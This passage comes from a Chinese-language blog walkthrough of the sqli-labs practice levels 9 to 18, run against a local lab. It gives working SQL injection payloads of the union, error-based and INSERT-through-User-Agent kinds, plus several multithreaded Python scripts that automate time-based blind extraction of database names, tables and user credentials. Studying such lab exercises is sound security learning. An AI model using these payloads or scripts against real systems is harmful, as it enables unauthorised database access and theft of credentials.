t1.start()</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">def get_payload(q):</span><br><span class="line">        for z in range(1,94):</span><br><span class="line">            for j in range(43,90):</span><br><span class="line">                payload = &quot;&#x27; and if(substr((select group_concat(username) from users),%d,1)=&#x27;%c&#x27;,sleep(5),0) --+ &quot; % (z, j)</span><br><span class="line">                if j &gt;= 65:</span><br><span class="line">                    dic = &#123;&quot;search&quot;: chr(j+32), &quot;payload&quot;: payload&#125;</span><br><span class="line">                    q.put(dic)</span><br><span class="line">                else:</span><br><span class="line">                    dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload&#125;</span><br><span class="line">                    q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot;+dic[&quot;payload&quot;]</span><br><span class="line">    time_1 = time.time()</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    time_2 = time.time()</span><br><span class="line">    if time_2 - time_1 &gt; 4:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206022256838.png" alt="image-20220602225600775"></p><h4 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h4><p>到了11关，就开始post注入了，之前写的检测闭合也就不管用了，第一次碰到post注入，有点懵，不知道怎么搞好，本来以为输入万能密码能登录进去。最后还是靠着输入\利用报错得到闭合符’,接下来</p><p><strong>测字段</strong>：admin’ order by 2 #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206052252604.png" alt="image-20220605225210570"></p><p><strong>爆数据库与版本：</strong>-1’ union select database(),version() #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206052211931.png" alt="image-20220605221140837"></p><p><strong>爆表</strong>：1’  union select (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() ),2 #</p><p>-1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()) #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061343920.png" alt="image-20220606134253861"></p><p><strong>查字段名：</strong>1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ and table_schema &#x3D; database()) #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061349734.png" alt="image-20220606134936694"></p><p><strong>爆账号和密码：</strong></p><p>1’ union select (select group_concat(username) from users),(select group_concat(password) from users) #</p><p>或</p><p>1’ union select (select group_concat(concat_ws(‘~’,username,password)) from users),2 #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061354152.png" alt="image-20220606135429104"></p><h4 id="Less-12："><a href="#Less-12：" class="headerlink" title="Less-12："></a><strong>Less-12</strong>：</h4><p>首先\试试水，这里显示报错了，说明是”)闭合</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061355369.png" alt="image-20220606135526334"></p><p><strong>字段：</strong>admin”) order by 2 #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061418049.png" alt="image-20220606141838012"></p><p><strong>爆数据库与版本</strong>：-1”) union select database(),version() #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061403926.png" alt="image-20220606140307894"></p><p><strong>爆表名：</strong>-1”) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()) #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061421789.png" alt="image-20220606142113753"></p><p><strong>爆字段名：</strong>-1”) union select 1,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; database() and table_name&#x3D; ‘users’) #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061429310.png" alt="image-20220606142934275"></p><p><strong>爆账号密码：</strong>1”) union select (select group_concat(concat_ws(‘~’,username,password)) from users),2 #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206061439797.png" alt="image-20220606143922758"></p><h4 id="Less-13-14"><a href="#Less-13-14" class="headerlink" title="Less-13-14"></a>Less-13-14</h4><p>老样子\判断出闭合这里发现是’)闭合，测出了字段为2却没有任何回显。一开始是觉得用时间盲注，但反复测试发现都没用，网上查了查发现是报错注入，第一次做报错注入，有点生疏</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206062213618.png" alt="image-20220606221351542"></p><p>用一个简单的报错注入成功爆出数据库</p><h5 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h5><p>也是一样用\判断出闭符”，我就不一一列举了，下面以13题为为例</p><p><strong>爆出数据库</strong>：’) and (extractvalue(1,concat(0x7e,(select database()),0x7e))) # </p><p>**爆出版本’) and (extractvalue(1,concat(0x7e,(select version()),0x7e))) # **</p><p><strong><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206062237295.png" alt="image-20220606223729261"></strong></p><p><strong>爆出表名</strong>：’) and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()),0x7e))) #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206071024020.png" alt="image-20220607102430981"></p><p><strong>爆字段</strong>：’) and (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e))) #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206071014183.png" alt="image-20220607101439093"></p><p><strong>爆账号密码</strong>：’) and  (updatexml(1,concat(0x7e,(select group_concat(concat_ws(‘~’,username,password)) from users),0x7e),1))#</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206071039018.png" alt="image-20220607103946985"></p><h4 id="Less-15-16"><a href="#Less-15-16" class="headerlink" title="Less-15-16"></a>Less-15-16</h4><h5 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h5><p>这里输入\并没有回显报错信息，但输入正确的账号和密码后，下方的图片会变换，所以初步判定为时间盲注。手工测试的闭合符为’</p><h5 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h5><p>手工测试的闭合符为”),下面以15关为例</p><p><strong>测字段数：admin’ order by 2#</strong><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206141251208.png" alt="image-20220614125139144"></p><p><strong>爆数据库</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    for i in range(20):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(0, 10):</span><br><span class="line">            for j in range(91, 127):</span><br><span class="line">                payload = &#123;</span><br><span class="line">                    &quot;uname&quot;: &quot;admin&#x27; union select 1,if(substr(database(),%d,1)=&#x27;%c&#x27;,sleep(3),0)#&quot;%(i,j),&quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-15/&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64;rv: 46.0) Gecko / 20100101Firefox / 46.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line"></span><br><span class="line">    requests.post(url=url, headers=headers, data=dic[&quot;payload&quot;])</span><br><span class="line"></span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206172001738.png" alt="image-20220617200136665"></p><p><strong>数据库版本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    for i in range(1):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(1, 10):</span><br><span class="line">            for j in range(0, 10):</span><br><span class="line">                payload = &#123;</span><br><span class="line">                    &quot;uname&quot;: &quot;admin&#x27; union select 1,if(substr(version(),%d,1)=&#x27;%d&#x27;,sleep(3),0)#&quot;%(i,j),&quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                dic = &#123;&quot;search&quot;: j, &quot;payload&quot;: payload&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-15/&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64;rv: 46.0) Gecko / 20100101Firefox / 46.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line"></span><br><span class="line">    requests.post(url=url, headers=headers, data=dic[&quot;payload&quot;])</span><br><span class="line"></span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;.&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206172028444.png" alt="image-20220617202848381"></p><p><strong>爆表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from threading import Thread,Lock</span><br><span class="line">import time</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line">lock = Lock()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    for i in range(20):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(0, 10):</span><br><span class="line">        for z in range(1, 15):</span><br><span class="line">            for j in range(91, 127):</span><br><span class="line">                payload = &#123;</span><br><span class="line">                    &quot;uname&quot;: &quot;admin&#x27; and if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&#x27;%c&#x27;,sleep(3),0)#&quot;%(i,z,j),&quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload,&quot;page&quot;:i&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-15/&quot;</span><br><span class="line">    global page_1</span><br><span class="line">    lock.acquire()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64;rv: 46.0) Gecko / 20100101Firefox / 46.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line"></span><br><span class="line">    requests.post(url=url, headers=headers, data=dic[&quot;payload&quot;])</span><br><span class="line">    if dic[&quot;page&quot;] &gt; page_1:</span><br><span class="line">        page_1 = dic[&quot;page&quot;]</span><br><span class="line">        print()</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line">    lock.release()</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line">    page_1 = 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于python的多线程竞争问题，所以加了锁，但这也同样导致了多线程变成了单线程   T_T</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206171947257.png" alt="image-20220617194710105"></p><p>爆字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from threading import Thread,Lock</span><br><span class="line">import time</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line">lock = Lock()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    for i in range(20):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(0, 10):</span><br><span class="line">        for z in range(1, 15):</span><br><span class="line">            for j in range(91, 127):</span><br><span class="line">                payload = &#123;</span><br><span class="line">                    &quot;uname&quot;: &quot;admin&#x27; and if(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit %d,1),%d,1)=&#x27;%c&#x27;,sleep(5),0)#&quot;%(i,z,j),&quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload,&quot;page&quot;:i&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-15/&quot;</span><br><span class="line">    global page_1</span><br><span class="line">    lock.acquire()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64;rv: 46.0) Gecko / 20100101Firefox / 46.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line"></span><br><span class="line">    requests.post(url=url, headers=headers, data=dic[&quot;payload&quot;])</span><br><span class="line">    if dic[&quot;page&quot;] &gt; page_1:</span><br><span class="line">        page_1 = dic[&quot;page&quot;]</span><br><span class="line">        print()</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line">    lock.release()</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line">    page_1 = 0</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206172047468.png" alt="image-20220617204746404"></p><p><strong>账号密码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">from threading import Thread,Lock</span><br><span class="line">import time</span><br><span class="line">from queue import Queue</span><br><span class="line"></span><br><span class="line">lock = Lock()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    for i in range(20):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line">def get_payload(q):</span><br><span class="line">    for i in range(0, 10):</span><br><span class="line">        for z in range(1, 105):</span><br><span class="line">            for j in range(43,96):</span><br><span class="line">                payload = &#123;</span><br><span class="line">                    &quot;uname&quot;: &quot;admin&#x27; and if(substr((select group_concat(username) from users),%d,1)=&#x27;%c&#x27;,sleep(5),0)#&quot;%(z,j),&quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;</span><br><span class="line">                &#125;</span><br><span class="line">                if j &gt;= 65:</span><br><span class="line">                    dic = &#123;&quot;search&quot;: chr(j+32), &quot;payload&quot;: payload, &quot;page&quot;: i&#125;</span><br><span class="line">                    q.put(dic)</span><br><span class="line">                else:</span><br><span class="line">                    dic = &#123;&quot;search&quot;: chr(j), &quot;payload&quot;: payload,&quot;page&quot;:i&#125;</span><br><span class="line">                    q.put(dic)</span><br><span class="line"></span><br><span class="line">def controller(q):</span><br><span class="line">    while True:</span><br><span class="line">        if q.empty():</span><br><span class="line">            break</span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line">def send_data(dic):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqli-labs-master/Less-15/&quot;</span><br><span class="line">    global page_1</span><br><span class="line">    lock.acquire()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64;rv: 46.0) Gecko / 20100101Firefox / 46.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line"></span><br><span class="line">    requests.post(url=url, headers=headers, data=dic[&quot;payload&quot;])</span><br><span class="line">    if dic[&quot;page&quot;] &gt; page_1:</span><br><span class="line">        page_1 = dic[&quot;page&quot;]</span><br><span class="line">        print()</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    if t_time2 - t_time1 &gt; 2:</span><br><span class="line">        print(dic[&quot;search&quot;],end=&#x27;&#x27;)</span><br><span class="line">    lock.release()</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line">    page_1 = 0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206172158250.png" alt="image-20220617215838190"></p><h4 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h4><p>这题做的无头无序的，卡了很长时间，百度后看了别人审计源码，从而得知注入点在password又因为这个是修改密码，只要用户名存在，password处不管输什么都返回正确页面，所以这题只能用报错注入来做</p><p><strong>爆数据库名：</strong>uname&#x3D;admin&amp;passwd&#x3D;1’and (updatexml(1,concat(0x7e,(select database()),0x7e),1))–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207111139846.png" alt="image-20220711113925734"></p><p><strong>爆数据库版本：</strong>uname&#x3D;admin&amp;passwd&#x3D;1’and (updatexml(1,concat(0x7e,(select version()),0x7e),1))–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207111142110.png" alt="image-20220711114209045"></p><p><strong>爆表：</strong>uname&#x3D;admin&amp;passwd&#x3D;1’and (updatexml(1,concat(0x7e,(select (select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database())),0x7e),1))–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207111144776.png" alt="image-20220711114426710"></p><p><strong>爆字段名：</strong>uname&#x3D;admin&amp;passwd&#x3D;1’and (updatexml(1,concat(0x7e,(select (select group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘users’)),0x7e),1))–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207111217184.png" alt="image-20220711121718115"></p><p><strong>爆账号密码：</strong>uname&#x3D;admin&amp;passwd&#x3D;-1’ and updatexml(1,concat(0x7e,(select group_concat(username) from (select username from users)a)),1)#</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207111357965.png" alt="image-20220711135756894"></p><h4 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h4><p>首先访问页面，会显示本机ip地址。</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207151949096.png" alt="image-20220715194921025"></p><p>一开始想的是修改bp中的X-Forwarded-For进行绕过ip，但输入正确的账号密码后却显示了User-Agent</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207151953938.png" alt="image-20220715195308888"></p><p>那么注入点大概率会出现在User-Agent上面，尝试修改User-Agent后发现也能成功回显</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207151958130.png" alt="image-20220715195841087"></p><p>然后根据网上的wp得知User-Agent与数据库进行交互从而得知注入点就是在User-Agent上面。那么开始构造payload</p><p><strong>爆出数据库</strong>：’ or updatexml(1,concat(0x7e,database(),0x7e),1),’’,’’) ##</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207152010773.png" alt="image-20220715201028727"></p><p>这里需要注意这是登录成功的条件下才能触发的，而且既然是insert注入，需要用,’’,’’)闭合后面的 sql 语句，否则就是语法错误了.</p><p><strong>爆数据库版本名</strong>：’ or updatexml(1,concat(0x7e,version(),0x7e),1),’’,’’) #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207161556519.png" alt="image-20220716155606415"></p><p><strong>爆表名</strong>：’ or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1),’’,’’) #<img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207161558691.png" alt="image-20220716155818639"></p><p><strong>爆字段</strong>：’ or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e),1),’’,’’) #<img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207161600028.png" 